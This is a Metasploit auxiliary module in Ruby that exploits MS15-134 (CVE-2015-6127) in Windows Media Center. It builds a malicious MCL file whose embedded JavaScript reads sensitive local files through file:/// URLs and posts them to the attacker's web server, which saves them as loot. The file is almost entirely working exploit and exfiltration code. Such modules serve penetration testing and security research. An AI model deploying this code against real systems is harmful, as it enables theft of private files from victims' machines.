##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'cgi'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
        file to render itself as an HTML document in the local machine zone by Internet Explorer,
        which can be used to leak files on the target machine.

        Please be aware that if this exploit is used against a patched Windows, it can cause the
        computer to be very slow or unresponsive (100% CPU). It seems to be related to how the
        exploit uses the URL attribute in order to render itself as an HTML file.
      },
      'Author'         =>
        [
          'Francisco Falcon', # Vuln discovery & PoCs & Detailed write-ups & awesomeness
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-6127'],
          ['MSB', 'MS15-134'],
          ['URL', 'https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/'],
          ['URL', 'http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference']
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 8 2015",
    ))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),
        OptPath.new('FILES',      [true, 'Files you wish to download', ::File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files_win.txt')])
      ])
  end

  def receiver_page
    @receiver_page_name ||= Rex::Text.rand_text_alpha(5)
  end

  def js
    %Q|
function sendFile(fname, data) {
  var xmlHttp = new XMLHttpRequest();
  if (!xmlHttp) { return 0; }
  xmlHttp.open('POST', '#{get_uri}/#{receiver_page}', true);
  xmlHttp.setRequestHeader('Content-type', 'multipart/form-data');
  xmlHttp.setRequestHeader('Connection', 'close');
  var body = 'fname=' + encodeURIComponent(fname) + '&data=' + data.toString();
  xmlHttp.send(body);
}

function getFile(fname) {
  var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
  xmlHttp.open('GET', fname, false);
  xmlHttp.send();
  return xmlHttp.responseBody.toArray();
}

var files = [#{load_file_paths * ","}];

for (var i=0; i < files.length; i++) {
  try {
    var data = getFile('file:///' + files[i]);
    sendFile(files[i], data);
  } catch (e) {}
}

    |
  end

  def generate_mcl
    %Q|<application url="#{datastore['FILENAME']}">
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE-edge">
</head>
<body>
<script type="text/javascript">
#{js}
</script>
</body>
</html>
</application>
    |
  end

  def load_file_paths
    @files ||= lambda {
      buf = ''
      ::File.open(datastore['FILES'], 'rb') do |f|
        buf = f.read
      end
      buf.split.map { |n| "\"#{n.gsub!(/\\/, '/')}\"" }
    }.call
  end

  def run
    exploit
  end

  def start_service(opts = {})
    super
    print_status("Generating #{datastore['FILENAME']}...")
    mcl = generate_mcl
    file_create(mcl)
    print_status("Pass #{datastore['FILENAME']} to the target you wish to exploit.")
    print_status("When the MCL is executed, it should start sending data (files) back")
    print_status("to our web server.")
  end

  def is_ie?(request)
    fp = fingerprint_user_agent(request.headers['User-Agent'])
    fp[:ua_name] == HttpClients::IE
  end

  def parse_data(data)
    buf = ''
    data.scan(/\d+/).each do |n|
      buf << n.to_i.chr
    end
    buf
  end

  def parse_body(body)
    params = CGI::parse(body)

    {
      fname: ::File.basename(params['fname'].first),
      data:  parse_data(params['data'].first)
    }
  end

  def on_request_uri(cli, request)
    unless is_ie?(request)
      print_error('Client is not Internet Explorer.')
      send_not_found(cli)
      return
    end

    unless /#{receiver_page}/i === request.uri
      print_error("Unknown request: #{request.uri}")
      send_not_found(cli)
      return
    end

    buff = ''

    print_status("Receiving data...")
    file = parse_body(request.body.to_s)
    p = store_loot('mcl.file', 'application/octet-stream', cli.peerhost, file[:data], file[:fname])
    print_good("#{file[:fname]} saved as: #{p}")

    # If you are kind of lazy to open the saved files, and just sort of want to see the data,
    # here you go (handy for debugging purposes, but against a larger network this is probably
    # too much info)
    vprint_status("File collected: #{file[:fname]}\n\n#{Rex::Text.to_hex_dump(file[:data])}")

  end
end
